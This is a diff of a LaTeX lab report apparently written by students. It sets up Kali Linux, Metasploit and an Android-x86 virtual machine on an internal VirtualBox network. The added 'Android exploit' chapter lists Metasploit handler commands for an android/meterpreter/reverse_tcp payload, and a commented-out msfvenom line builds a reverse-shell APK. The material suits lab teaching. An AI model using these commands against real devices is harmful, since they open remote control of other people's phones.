@@ -187,8 +187,8 @@ Once you are successful in logging in, you will be greeted by the following spla
 \end{figure}
 \section{Metasploit on Kali Linux}
 \subsection{Installation for the command line}
-To install Metasploit on Kali Linux the following has to be done.
-Go to the following GitHub url: \url{https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers}\\
+By default Kali Linux comes with Metasploit out-of-the-box. However, to install Metasploit on a Linux operating system the following has to be done.
+Go to the following GitHub url:\\ \url{https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers}\\
 Copy the following command: 
 \begin{minted}
 [
@@ -339,204 +339,384 @@ Thereafter another window will pop up. Let it automatically make a choice. If it
     \centering
     \includegraphics[scale=0.4]{pics/prompt2.PNG}
 \end{figure}
-The Metasploit Framework Grahphical User Interface (GUI) will now be up and running. This is shown in the figure below.
+The Metasploit Framework Graphical User Interface (GUI) will now be up and running. This is shown in the figure below.
 \begin{figure}[H]
     \centering
-    \includegraphics[scale=0.5]{pics/metaguimain.PNG}
+    \includegraphics[scale=0.4]{pics/metaguimain.PNG}
     \caption{The main screen for the Metasploit Framework GUI}
 \end{figure}
-\section{Android Emulator installation}
-For the first scenario covered in Section~\ref{sec:sec1} we will utilise an Emulator to virtualise an Android phone. This is keeping in line with the topic of virtualisation mentioned in Section~\ref{sec:sec2}. To emulate such a device you will need the Android Software Development Kit (SDK). This can be downloaded from the following url: \url{https://developer.android.com/studio}. Below is a screenshot of this page.
+\section{Android Emulation}
+For the first scenario covered in Section~\ref{sec:sec1} we will utilise an Emulator to virtualise an Android phone. This is keeping in line with the topic of virtualisation mentioned in Section~\ref{sec:sec2}. To emulate such a device you will need the Android Software Development Kit (SDK) or an ISO image which can be downloaded for VirtualBox. The SDK can be downloaded from the following url: \url{https://developer.android.com/studio}. Below is a screenshot of this page.
 \begin{figure}[H]
     \centering
-    \includegraphics[scale=0.5]{pics/as1.PNG}
+    \includegraphics[scale=0.4]{pics/as1.PNG}
     \caption{Homepage of Android Studio}
 \end{figure}
-Therefore open up the link in the browser of Kali Linux and click on button \textbf{Download Android Studio}. Thereafter Agree to the Terms and Conditions and click on the \textbf{Download Android Studio} button once again.
+The url for the ISO image can be acquired from the Android-x86 Project's site located at: \url{https://www.android-x86.org/}\\
+Below is screenshot of this site.
 \begin{figure}[H]
     \centering
-    \includegraphics[scale=0.5]{pics/as2.PNG}
-    \caption{Agree to the terms and conditions}
+    \includegraphics[scale=0.5]{pics/andro-proj.PNG}
+    \caption{Homepage of Android-x86}
 \end{figure}
-After the file has been downloaded you will see it is a \texttt{tar.gz} file. You can extract it to the Desktop either using the command line or the File Explorer. Below both options are shown. Run the following command in a terminal where the file was downloaded.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-tar -xf filename.tar.gz -C /home/kali/Desktop
-\end{minted}
-The figure below shows a folder named \texttt{android-studio} created on the Desktop.
+Once the ISO image has been downloaded create a new virtual machine in VirtualBox and attach the ISO. Thereafter assign the default recommended amounts of Processors, Storage, Memory etc. as was done with Kali Linux above. Below is a screenshot of the VM once it has been set up.
 \begin{figure}[H]
     \centering
-    \includegraphics[scale=0.5]{pics/as3.PNG}
-    \caption{File extracted with the File Explorer}
+    \includegraphics[scale=0.5]{pics/andro-proj2.PNG}
+    \caption{Android VM main screen}
 \end{figure}
-We can now start up Android Studio and thereafter create an Android phone emulator. You will have to run the \texttt{studio} shell script inside the Android Studio folder. This can be done by running the commands below.
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-cd ~/Desktop/android-studio
-\end{minted}
-Thereafter,
-\begin{minted}
-[
-frame=lines,
-framesep=2mm,
-baselinestretch=1.2,
-bgcolor=LightBlue,
-fontsize=\footnotesize,
-breaklines,
-breaksymbolleft=\carriagereturn
-]
-{Shell}
-./studio
-\end{minted}
-You will be prompted with \texttt{Import Android Studio Settings}. Choose the \textbf{Do not import settings} and click \textbf{Ok}.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/as4.PNG}
-    \caption{Do not import settings}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.5]{pics/as5.PNG}
-    \caption{Data Sharing screen}
-\end{figure}
-Choose any option for the Data Sharing screen
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as6.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as7.PNG}
-\end{figure}
-\end{multicols}
-Click \textbf{Next} on both of the above screens
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as8.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as9.PNG}
-\end{figure}
-\end{multicols}
-Click \textbf{Next} on both of the above screens
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as10.PNG}
-    \caption{Final Screen}
-\end{figure}
-Click on \textbf{Finish}. Thereafter you will see that the Components will begin downloading as seen in the figure below.
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as11.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as12.PNG}
-\end{figure}
-\end{multicols}
-Click on \textbf{Finish} after everything is completed. Thereafter you will see the \texttt{Welcome to Android Studio} screen.
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as13.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as14.PNG}
-\end{figure}
-\end{multicols}
-Click on \textbf{More actions} and then select the \textbf{AVD Manager} option. You will be lead to the \texttt{Android Virtual Device Manager} screen. Click on the \textbf{+ Create Virtual Device...} option.
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as15.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as16.PNG}
-\end{figure}
-\end{multicols}
-You will have to \textbf{Select Hardware}, and thereafter the \textbf{System Image}. For the purposes of this project the following specifications were utilised:
-\begin{itemize}
-    \item \textit{Hardware}: Pixel 3a
-    \item \textit{System Image}:
-    \begin{itemize}
-        \item \textit{Release name}: R
-        \item \textit{API Level}: 30
-        \item \textit{Target}: Android 11.0
-    \end{itemize}
-\end{itemize}
-You will have to download the System Image if it is not installed.
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.3]{pics/as17.PNG}
-    \caption{License Agreement screen}
-\end{figure}
-Make sure to agree to the License Agreement before downloading the System Image and then click \textbf{Next}.
-\pagebreak
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.2]{pics/as18.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.2]{pics/as19.PNG}
-\end{figure}
-\end{multicols}
-Click on \textbf{Finish} after the install is done.
-\begin{multicols}{2}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.2]{pics/as20.PNG}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=0.2]{pics/as21.PNG}
-\end{figure}
-\end{multicols}
-You should be able to select the newly installed System Image and click on \textbf{Next}. Thereafter under the \textbf{Emulated Performance -$>$ Graphics} settings. Choose the \textbf{Software - GLES 2.0} option if you do not have a GPU on your host machine. If a GPU is present you can select the \textbf{Hardware - GLES 2.0} option. Thereafter click on \textbf{Finish}.
-Click on \textbf{Finish} after the download is completed.
+% Therefore open up the link in the browser of Kali Linux and click on button \textbf{Download Android Studio}. Thereafter Agree to the Terms and Conditions and click on the \textbf{Download Android Studio} button once again.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/as2.PNG}
+%     \caption{Agree to the terms and conditions}
+% \end{figure}
+% After the file has been downloaded you will see it is a \texttt{tar.gz} file. You can extract it to the Desktop either using the command line or the File Explorer. Below both options are shown. Run the following command in a terminal where the file was downloaded.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% tar -xf filename.tar.gz -C /home/kali/Desktop
+% \end{minted}
+% The figure below shows a folder named \texttt{android-studio} created on the Desktop.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/as3.PNG}
+%     \caption{File extracted with the File Explorer}
+% \end{figure}
+% We can now start up Android Studio and thereafter create an Android phone emulator. You will have to run the \texttt{studio} shell script inside the Android Studio folder. This can be done by running the commands below.
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% cd ~/Desktop/android-studio
+% \end{minted}
+% Thereafter,
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% ./studio
+% \end{minted}
+% You will be prompted with \texttt{Import Android Studio Settings}. Choose the \textbf{Do not import settings} and click \textbf{Ok}.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/as4.PNG}
+%     \caption{Do not import settings}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.5]{pics/as5.PNG}
+%     \caption{Data Sharing screen}
+% \end{figure}
+% Choose any option for the Data Sharing screen
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as6.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as7.PNG}
+% \end{figure}
+% \end{multicols}
+% Click \textbf{Next} on both of the above screens
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as8.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as9.PNG}
+% \end{figure}
+% \end{multicols}
+% Click \textbf{Next} on both of the above screens
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as10.PNG}
+%     \caption{Final Screen}
+% \end{figure}
+% Click on \textbf{Finish}. Thereafter you will see that the Components will begin downloading as seen in the figure below.
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as11.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as12.PNG}
+% \end{figure}
+% \end{multicols}
+% Click on \textbf{Finish} after everything is completed. Thereafter you will see the \texttt{Welcome to Android Studio} screen.
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as13.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as14.PNG}
+% \end{figure}
+% \end{multicols}
+% Click on \textbf{More actions} and then select the \textbf{AVD Manager} option. You will be lead to the \texttt{Android Virtual Device Manager} screen. Click on the \textbf{+ Create Virtual Device...} option.
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as15.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as16.PNG}
+% \end{figure}
+% \end{multicols}
+% You will have to \textbf{Select Hardware}, and thereafter the \textbf{System Image}. For the purposes of this project the following specifications were utilised:
+% \begin{itemize}
+%     \item \textit{Hardware}: Pixel 3a
+%     \item \textit{System Image}:
+%     \begin{itemize}
+%         \item \textit{Release name}: R
+%         \item \textit{API Level}: 30
+%         \item \textit{Target}: Android 11.0
+%     \end{itemize}
+% \end{itemize}
+% You will have to download the System Image if it is not installed.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.3]{pics/as17.PNG}
+%     \caption{License Agreement screen}
+% \end{figure}
+% Make sure to agree to the License Agreement before downloading the System Image and then click \textbf{Next}.
+% \pagebreak
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.2]{pics/as18.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.2]{pics/as19.PNG}
+% \end{figure}
+% \end{multicols}
+% Click on \textbf{Finish} after the install is done.
+% \begin{multicols}{2}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.2]{pics/as20.PNG}
+% \end{figure}
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.2]{pics/as21.PNG}
+% \end{figure}
+% \end{multicols}
+% You should be able to select the newly installed System Image and click on \textbf{Next}. Thereafter under the \textbf{Emulated Performance -$>$ Graphics} settings. Choose the \textbf{Software - GLES 2.0} option if you do not have a GPU on your host machine. If a GPU is present you can select the \textbf{Hardware - GLES 2.0} option. Thereafter click on \textbf{Finish}.
+% Click on \textbf{Finish} after the download is completed.
 
-You should see the following in your \textbf{AVD Manager} now as shown below.
+% You should see the following in your \textbf{AVD Manager} now as shown below.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=0.4]{pics/as22.PNG}
+%     \caption{Android Emulator listed under the AVD Manager}
+% \end{figure}
+% Click on the green arrow to start up the newly created Android Emulator.
+% \begin{figure}[H]
+%     \centering
+%     \includegraphics[scale=1]{pics/as23.PNG}
+%     \caption{The Android Emulator running}
+% \end{figure}
+\section{Network setup in VirtualBox}
+Networking is a key aspect of what makes or breaks the exploits covered in further chapters. Therefore the following steps have to be taken so that an internal virtual network can created which will allow the virtual machines to communicate with each other effectively and without worrying about gateways and other network related issues that can pop up.\\\\
+Navigate to Oracle VirtualBox and click on \textbf{File -$>$ Preferences}. This is shown below.
 \begin{figure}[H]
     \centering
-    \includegraphics[scale=0.4]{pics/as22.PNG}
-    \caption{Android Emulator listed under the AVD Manager}
+    \includegraphics[scale=0.8]{pics/net1.png}
 \end{figure}
-Click on the green arrow to start up the newly created Android Emulator.
+Navigate to the \texttt{Network} tab on the left hand side. Thereafter, click on the green plus icon the right to create a new \textbf{NatNetwork}. This is shown below.
 \begin{figure}[H]
     \centering
-    \includegraphics[scale=1]{pics/as23.PNG}
-    \caption{The Android Emulator running}
+    \includegraphics[scale=1]{pics/net2.png}
 \end{figure}
+Click \textbf{OK} to save the settings. Now go to the settings for each of your virtual machines and under the \texttt{Network} tab select the newly created Nat Network as your Adapter. This is demonstrated below.
+\begin{figure}[H]
+    \centering
+    \includegraphics[scale=1]{pics/net3.png}
+\end{figure}
+\section{Blog}
+The blog we created was hosted on GitHub Pages. The link to the blog is:\\
+\url{https://ITRI625.github.io}\\\\
+More information on GitHub Pages can be found at: \url{https://pages.github.com/}\\\\
+The template for the blog was acquired from:\\
+\url{https://startbootstrap.com/theme/clean-blog}\\\\
+GIFs on the Blog were sourced from \url{https://tenor.com/}\\\\
+Additionally, the screenshots taken were from VMs we implemented in VirtualBox and other images for the headers were sourced from Google Images.
 \chapter{Scenario 1: Android exploit}
 \label{sec:sec1}
+Here are the steps taken to exploit the Android virtual machine.\\\\
+Step 1: Open up the Metasploit console in Kali Linux by running the command below:
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+msfconsole
+\end{minted}
+Thereafter run the following:
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+use exploit/multi/handler
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+use exploit/multi/handler
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+search android/meterpreter
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+set payload android/meterpreter/reverse_tcp
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+show options
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+set LHOST <ip_address>
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+set LPORT <port_number>
+\end{minted}
+
+\begin{minted}
+[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+breaksymbolleft=\carriagereturn
+]
+{Shell}
+exploit
+\end{minted}
+
+% \begin{minted}
+% [
+% frame=lines,
+% framesep=2mm,
+% baselinestretch=1.2,
+% bgcolor=LightBlue,
+% fontsize=\footnotesize,
+% breaklines,
+% breaksymbolleft=\carriagereturn
+% ]
+% {Shell}
+% msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /root/filename.apk
+% \end{minted}
+
+
 \chapter{Scenario 2: Windows exploit}
 \chapter{Additional readings and miscellaneous information}
 \url{https://citizenlab.ca/}
-\url{https://www.android-x86.org/}
 \printbibliography[heading=bibintoc]
 \end{document}
